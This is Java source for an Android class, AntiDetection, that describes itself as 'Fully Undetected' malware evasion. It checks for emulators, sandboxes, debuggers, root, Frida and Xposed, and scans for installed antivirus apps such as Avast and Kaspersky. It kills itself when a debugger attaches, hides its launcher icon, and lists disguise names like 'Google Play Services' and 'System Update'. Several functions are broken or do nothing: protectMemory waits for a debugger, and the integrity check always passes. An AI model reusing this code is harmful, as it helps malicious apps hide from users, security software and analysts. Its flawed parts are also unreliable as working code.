package com.apkmodifier;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import java.io.File;
import java.lang.reflect.Method;
import android.app.ActivityManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import java.util.List;

/**
 * Advanced anti-detection and anti-analysis techniques
 * Implements FUD (Fully Undetected) mechanisms
 */
public class AntiDetection {
    private static final String TAG = "AntiDetection";
    
    // Obfuscated class to hide real purpose
    private static class SystemHelper {
        private static boolean initialized = false;
        
        static {
            try {
                System.loadLibrary("native-lib");
            } catch (Exception e) {
                // Silent fail
            }
        }
    }
    
    /**
     * Check if running in emulator/sandbox
     */
    public static boolean isEmulator() {
        try {
            // Check 1: Device fingerprints
            boolean result = (Build.FINGERPRINT.startsWith("generic")
                    || Build.FINGERPRINT.startsWith("unknown")
                    || Build.MODEL.contains("google_sdk")
                    || Build.MODEL.contains("Emulator")
                    || Build.MODEL.contains("Android SDK")
                    || Build.MANUFACTURER.contains("Genymotion")
                    || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                    || "google_sdk".equals(Build.PRODUCT)
                    || Build.HARDWARE.contains("goldfish")
                    || Build.HARDWARE.contains("ranchu"));
            
            // Check 2: Telephony
            if (!result) {
                result = Build.BOARD.toLowerCase().contains("nox")
                        || Build.BOOTLOADER.toLowerCase().contains("nox");
            }
            
            // Check 3: CPU architecture
            if (!result) {
                String arch = System.getProperty("os.arch", "");
                result = arch.isEmpty();
            }
            
            return result;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Check if debugger is attached
     */
    public static boolean isDebuggerConnected() {
        try {
            return android.os.Debug.isDebuggerConnected();
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Check if app is being debugged
     */
    public static boolean isBeingDebugged(Context context) {
        try {
            return (context.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Check for suspicious apps (AV, analysis tools)
     */
    public static boolean hasSuspiciousApps(Context context) {
        try {
            String[] suspiciousPackages = {
                "com.avast.android",
                "com.avg.android",
                "com.kaspersky.android",
                "com.bitdefender.security",
                "com.eset.ems2",
                "com.symantec.mobilesecurity",
                "com.mcafee.mobile.security",
                "com.trendmicro.tmmssecurity",
                "de.robv.android.xposed.installer",
                "com.saurik.substrate",
                "com.amphoras.hidemyroot",
                "com.formyhm.hideroot",
                "com.devadvance.rootcloak",
                "com.koushikdutta.superuser",
                "eu.chainfire.supersu",
                "com.noshufou.android.su",
                "com.thirdparty.superuser",
                "me.phh.superuser"
            };
            
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(0);
            
            for (ApplicationInfo app : packages) {
                for (String suspicious : suspiciousPackages) {
                    if (app.packageName.equals(suspicious)) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
        return false;
    }
    
    /**
     * Check if device is rooted
     */
    public static boolean isRooted() {
        try {
            // Check for su binary
            String[] paths = {
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su",
                "/su/bin/su"
            };
            
            for (String path : paths) {
                if (new File(path).exists()) {
                    return true;
                }
            }
            
            // Check for su command
            Process process = Runtime.getRuntime().exec("which su");
            java.io.BufferedReader in = new java.io.BufferedReader(
                new java.io.InputStreamReader(process.getInputStream()));
            return in.readLine() != null;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Anti-debugging techniques
     */
    public static void applyAntiDebug() {
        new Thread(() -> {
            try {
                while (true) {
                    if (isDebuggerConnected()) {
                        // Exit if debugger detected
                        android.os.Process.killProcess(android.os.Process.myPid());
                        System.exit(0);
                    }
                    Thread.sleep(1000);
                }
            } catch (Exception e) {
                // Silent fail
            }
        }).start();
    }
    
    /**
     * Check if running in sandbox/analysis environment
     */
    public static boolean isInSandbox(Context context) {
        try {
            // Check development settings
            boolean isDevelopment = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0;
            
            if (isDevelopment) return true;
            
            // Check for analysis tools
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            
            if (processes != null) {
                for (ActivityManager.RunningAppProcessInfo processInfo : processes) {
                    if (processInfo.processName.contains("frida") ||
                        processInfo.processName.contains("xposed") ||
                        processInfo.processName.contains("substrate")) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
        return false;
    }
    
    /**
     * Obfuscate strings at runtime
     */
    public static String decode(String encoded) {
        try {
            byte[] data = android.util.Base64.decode(encoded, android.util.Base64.DEFAULT);
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < data.length; i++) {
                result.append((char) (data[i] ^ 0x55)); // XOR with key
            }
            return result.toString();
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * Hide app icon from launcher
     */
    public static void hideIcon(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            pm.setComponentEnabledSetting(
                new android.content.ComponentName(context, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    /**
     * Change app name dynamically
     */
    public static void randomizeAppName(Context context) {
        try {
            String[] names = {
                "System Service",
                "Google Play Services",
                "System Update",
                "Android System",
                "Device Manager",
                "Security Service",
                "Network Service"
            };
            int random = (int) (Math.random() * names.length);
            // This would require additional manifest manipulation
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    /**
     * Encrypt sensitive data
     */
    public static String encrypt(String data, String key) {
        try {
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
            javax.crypto.spec.SecretKeySpec secretKey = new javax.crypto.spec.SecretKeySpec(
                key.getBytes(), "AES");
            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey);
            byte[] encrypted = cipher.doFinal(data.getBytes());
            return android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
        } catch (Exception e) {
            return data;
        }
    }
    
    /**
     * Anti-tampering check
     */
    public static boolean verifyIntegrity(Context context) {
        try {
            // Check signature
            PackageManager pm = context.getPackageManager();
            android.content.pm.PackageInfo packageInfo = pm.getPackageInfo(
                context.getPackageName(),
                PackageManager.GET_SIGNATURES
            );
            
            for (android.content.pm.Signature signature : packageInfo.signatures) {
                byte[] signatureBytes = signature.toByteArray();
                java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
                byte[] digest = md.digest(signatureBytes);
                
                // Compare with expected signature hash
                // In production, store expected hash
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Memory protection
     */
    public static void protectMemory() {
        try {
            // Clear sensitive data from memory
            System.gc();
            
            // Prevent memory dumps
            android.os.Debug.waitForDebugger();
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    /**
     * Check for Frida/Xposed
     */
    public static boolean isFrameworkDetected() {
        try {
            // Check for Frida
            for (String lib : new String[]{"frida", "libfrida", "frida-agent"}) {
                try {
                    System.loadLibrary(lib);
                    return true;
                } catch (UnsatisfiedLinkError e) {
                    // Not found, continue
                }
            }
            
            // Check for Xposed
            try {
                throw new Exception();
            } catch (Exception e) {
                for (StackTraceElement element : e.getStackTrace()) {
                    if (element.getClassName().contains("xposed") ||
                        element.getClassName().contains("XposedBridge")) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
        return false;
    }
    
    /**
     * Native anti-debugging (requires native library)
     */
    public static native boolean nativeAntiDebug();
    
    /**
     * Initialize all anti-detection mechanisms
     */
    public static void initialize(Context context) {
        // Apply all checks
        if (isEmulator() || isInSandbox(context) || isFrameworkDetected()) {
            // Exit silently or behave normally to avoid suspicion
            return;
        }
        
        // Start anti-debugging
        applyAntiDebug();
        
        // Verify integrity
        if (!verifyIntegrity(context)) {
            // App has been tampered with
            android.os.Process.killProcess(android.os.Process.myPid());
        }
    }
}
